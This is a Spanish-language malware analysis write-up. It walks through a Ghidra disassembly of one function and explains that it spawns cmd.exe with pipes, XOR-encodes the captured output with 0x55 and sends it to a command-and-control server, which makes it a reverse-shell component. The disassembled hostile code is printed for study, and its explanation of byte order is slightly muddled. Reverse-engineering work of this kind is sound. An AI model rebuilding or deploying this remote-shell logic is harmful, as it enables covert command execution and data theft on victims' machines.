```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __cdecl FUN_00402490(undefined4 param_1, undef
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[0x4]:4   param_1                                 XREF[1]:     004024c3(W)  
             undefined4        Stack[0x8]:4   param_2                                 XREF[1]:     004024c7(W)  
             undefined4        Stack[0xc]:4   param_3                                 XREF[2]:     00402506(W), 
                                                                                                   00402525(*)  
             undefined4        Stack[0x10]:4  param_4                                 XREF[1]:     004024ea(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[3]:     004024a6(*), 
                                                                                                   004024bb(W), 
                                                                                                   004024cd(*)  
                             FUN_00402490                                    XREF[1]:     FUN_004012f0:004017ca(c)  
        00402490 b8 6c 10        MOV        EAX,0x106c
                 00 00
        00402495 e8 66 10        CALL       FUN_00403500                                     undefined FUN_00403500(void)
                 00 00
        0040249a 53              PUSH       EBX
        0040249b 55              PUSH       EBP
        0040249c 56              PUSH       ESI
        0040249d 8b 35 74        MOV        ESI,dword ptr [->KERNEL32.DLL::CreatePipe]       = 00009a1e
                 90 40 00
        004024a3 33 db           XOR        EBX,EBX
        004024a5 57              PUSH       EDI
        004024a6 8d 44 24 10     LEA        EAX=>local_res0,[ESP + 0x10]
        004024aa 53              PUSH       EBX
        004024ab 50              PUSH       EAX
        004024ac bd 01 00        MOV        EBP,0x1
                 00 00
        004024b1 68 90 aa        PUSH       DAT_0040aa90
                 40 00
        004024b6 68 94 aa        PUSH       DAT_0040aa94
                 40 00
        004024bb c7 44 24        MOV        dword ptr [ESP + local_res0],0xc
                 20 0c 00 
                 00 00
        004024c3 89 5c 24 24     MOV        dword ptr [ESP + param_1],EBX
        004024c7 89 6c 24 28     MOV        dword ptr [ESP + param_2],EBP
        004024cb ff d6           CALL       ESI=>KERNEL32.DLL::CreatePipe
        004024cd 8d 4c 24 10     LEA        ECX=>local_res0,[ESP + 0x10]
        004024d1 53              PUSH       EBX
        004024d2 51              PUSH       ECX
        004024d3 68 88 aa        PUSH       DAT_0040aa88
                 40 00
        004024d8 68 8c aa        PUSH       DAT_0040aa8c
                 40 00
        004024dd ff d6           CALL       ESI=>KERNEL32.DLL::CreatePipe
        004024df a1 b4 a1        MOV        EAX,[DAT_0040a1b4]                               = 00657865h
                 40 00
        004024e4 8b 15 b0        MOV        EDX,dword ptr [DAT_0040a1b0]                     = 2E646D63h
                 a1 40 00
        004024ea 89 44 24 20     MOV        dword ptr [ESP + param_4],EAX
        004024ee b9 11 00        MOV        ECX,0x11
                 00 00
        004024f3 33 c0           XOR        EAX,EAX
        004024f5 8d 7c 24 24     LEA        EDI=>Stack[0x14],[ESP + 0x24]
        004024f9 f3 ab           STOSD.REP  ES:EDI
        004024fb a1 90 aa        MOV        EAX,[DAT_0040aa90]
                 40 00
        00402500 8b 0d 8c        MOV        ECX,dword ptr [DAT_0040aa8c]
                 aa 40 00
        00402506 89 54 24 1c     MOV        dword ptr [ESP + param_3],EDX
        0040250a 89 44 24 64     MOV        dword ptr [ESP + Stack[0x54]],EAX
        0040250e 89 44 24 60     MOV        dword ptr [ESP + Stack[0x50]],EAX
        00402512 8d 54 24 68     LEA        EDX=>Stack[0x58],[ESP + 0x68]
        00402516 8d 44 24 24     LEA        EAX=>Stack[0x14],[ESP + 0x24]
        0040251a 52              PUSH       EDX
        0040251b 50              PUSH       EAX
        0040251c 53              PUSH       EBX
        0040251d 53              PUSH       EBX
        0040251e 53              PUSH       EBX
        0040251f 89 4c 24 70     MOV        dword ptr [ESP + Stack[0x4c]],ECX
        00402523 55              PUSH       EBP
        00402524 53              PUSH       EBX
        00402525 8d 4c 24 38     LEA        ECX=>param_3,[ESP + 0x38]
        00402529 53              PUSH       EBX
        0040252a 51              PUSH       ECX
        0040252b 53              PUSH       EBX
        0040252c c7 44 24        MOV        dword ptr [ESP + Stack[0x40]],0x101
                 78 01 01 
                 00 00
        00402534 66 89 5c        MOV        word ptr [ESP + Stack[0x44]],BX
                 24 7c
        00402539 ff 15 70        CALL       dword ptr [->KERNEL32.DLL::CreateProcessA]       = 00009a0c
                 90 40 00
        0040253f 68 d0 07        PUSH       0x7d0
                 00 00
        00402544 ff 15 80        CALL       dword ptr [->KERNEL32.DLL::Sleep]                = 00009866
                 90 40 00
        0040254a 8b 35 6c        MOV        ESI,dword ptr [->KERNEL32.DLL::PeekNamedPipe]    = 000099fc
                 90 40 00
        00402550 8b 3d 68        MOV        EDI,dword ptr [->KERNEL32.DLL::ReadFile]         = 000099f0
                 90 40 00
        00402556 89 ac 24        MOV        dword ptr [ESP + 0x1078],EBP
                 78 10 00 00
        0040255d 8b ac 24        MOV        EBP,dword ptr [ESP + 0x1080]
                 80 10 00 00
                             LAB_00402564                                    XREF[1]:     004025dd(j)  
        00402564 a1 94 aa        MOV        EAX,[DAT_0040aa94]
                 40 00
        00402569 53              PUSH       EBX
        0040256a 53              PUSH       EBX
        0040256b 68 84 aa        PUSH       DAT_0040aa84
                 40 00
        00402570 8d 94 24        LEA        EDX,[ESP + 0x84]
                 84 00 00 00
        00402577 68 00 02        PUSH       0x200
                 00 00
        0040257c 52              PUSH       EDX
        0040257d 50              PUSH       EAX
        0040257e ff d6           CALL       ESI=>KERNEL32.DLL::PeekNamedPipe
        00402580 a1 84 aa        MOV        EAX,[DAT_0040aa84]
                 40 00
        00402585 3b c3           CMP        EAX,EBX
        00402587 76 56           JBE        LAB_004025df
        00402589 8b 15 94        MOV        EDX,dword ptr [DAT_0040aa94]
                 aa 40 00
        0040258f 53              PUSH       EBX
        00402590 68 84 aa        PUSH       DAT_0040aa84
                 40 00
        00402595 8d 8c 24        LEA        ECX,[ESP + 0x80]
                 80 00 00 00
        0040259c 50              PUSH       EAX
        0040259d 51              PUSH       ECX
        0040259e 52              PUSH       EDX
        0040259f ff d7           CALL       EDI=>KERNEL32.DLL::ReadFile
        004025a1 85 c0           TEST       EAX,EAX
        004025a3 74 3a           JZ         LAB_004025df
        004025a5 a1 84 aa        MOV        EAX,[DAT_0040aa84]
                 40 00
        004025aa 88 5c 04 78     MOV        byte ptr [ESP + EAX*0x1 + 0x78],BL
        004025ae 40              INC        EAX
        004025af a3 84 aa        MOV        [DAT_0040aa84],EAX
                 40 00
        004025b4 33 c0           XOR        EAX,EAX
                             LAB_004025b6                                    XREF[1]:     004025c7(j)  
        004025b6 8a 4c 04 78     MOV        CL,byte ptr [ESP + EAX*0x1 + 0x78]
        004025ba 80 f1 55        XOR        CL,0x55
        004025bd 88 4c 04 78     MOV        byte ptr [ESP + EAX*0x1 + 0x78],CL
        004025c1 40              INC        EAX
        004025c2 3d 00 10        CMP        EAX,0x1000
                 00 00
        004025c7 7c ed           JL         LAB_004025b6
        004025c9 53              PUSH       EBX
        004025ca 8d 44 24 7c     LEA        EAX,[ESP + 0x7c]
        004025ce 68 04 10        PUSH       0x1004
                 00 00
        004025d3 50              PUSH       EAX
        004025d4 55              PUSH       EBP
        004025d5 ff 15 68        CALL       dword ptr [->WS2_32.DLL::Ordinal_19]             = 80000013
                 91 40 00
        004025db 85 c0           TEST       EAX,EAX
        004025dd 7f 85           JG         LAB_00402564
                             LAB_004025df                                    XREF[2]:     00402587(j), 004025a3(j)  
        004025df 89 9c 24        MOV        dword ptr [ESP + 0x1078],EBX
                 78 10 00 00
        004025e6 33 c0           XOR        EAX,EAX
                             LAB_004025e8                                    XREF[1]:     004025f9(j)  
        004025e8 8a 4c 04 78     MOV        CL,byte ptr [ESP + EAX*0x1 + 0x78]
        004025ec 80 f1 55        XOR        CL,0x55
        004025ef 88 4c 04 78     MOV        byte ptr [ESP + EAX*0x1 + 0x78],CL
        004025f3 40              INC        EAX
        004025f4 3d 00 10        CMP        EAX,0x1000
                 00 00
        004025f9 7c ed           JL         LAB_004025e8
        004025fb 53              PUSH       EBX
        004025fc 8d 4c 24 7c     LEA        ECX,[ESP + 0x7c]
        00402600 68 04 10        PUSH       0x1004
                 00 00
        00402605 51              PUSH       ECX
        00402606 55              PUSH       EBP
        00402607 ff 15 68        CALL       dword ptr [->WS2_32.DLL::Ordinal_19]             = 80000013
                 91 40 00
        0040260d 5f              POP        EDI
        0040260e 5e              POP        ESI
        0040260f 5d              POP        EBP
        00402610 5b              POP        EBX
        00402611 81 c4 6c        ADD        ESP,0x106c
                 10 00 00
        00402617 c3              RET

```



Ejecuta un proceso (probablemente un comando de shell), captura su salida estándar, la descifra con XOR 0x55, y la envía al servidor C2 usando WS2_32.DLL::Ordinal_19 (probable send).

La función FUN_00402490 es un lanzador de comandos remoto cifrado, que:
- Lanza un proceso externo (probable cmd.exe /c <algo>).
- Lee su salida.
- La descifra.
- La envía al servidor C2.


Si hacemoss un strings o inspeccionamos el contenido de esas direcciones (0x0040a1b0 y 0x0040a1b4), seguramente veas un comando.


**Hacemos un Go to --> 0040a1b0**

```

                             DAT_0040a1b0                                    XREF[1]:     FUN_00402490:004024e4(R)  
        0040a1b0 63 6d 64 2e     undefined4 2E646D63h
```
El contenido en 0x0040a1b0 es: 63 6d 64 2e


Esto, leído en ASCII (little endian), corresponde a: "cmd."

Pero si inviertimos el orden de los bytes (como se almacenan en memoria little endian), tenemos: 2e 64 6d 63 → ".dmc"


Entonces, realmente esto representa la cadena "cmd."



**Hacemos un Go to --> 0040a1b4**

```
                             DAT_0040a1b4                                    XREF[1]:     FUN_00402490:004024df(R)  
        0040a1b4 65 78 65 00     undefined4 00657865h
        0040a1b8 00              ??         00h
        0040a1b9 00              ??         00h
        0040a1ba 00              ??         00h
        0040a1bb 00              ??         00h
        0040a1bc 00              ??         00h
        0040a1bd 00              ??         00h
        0040a1be 00              ??         00h
        0040a1bf 00              ??         00h

```

Contenido en hex: 65 78 65 00
Interpretación ASCII: "exe\0"
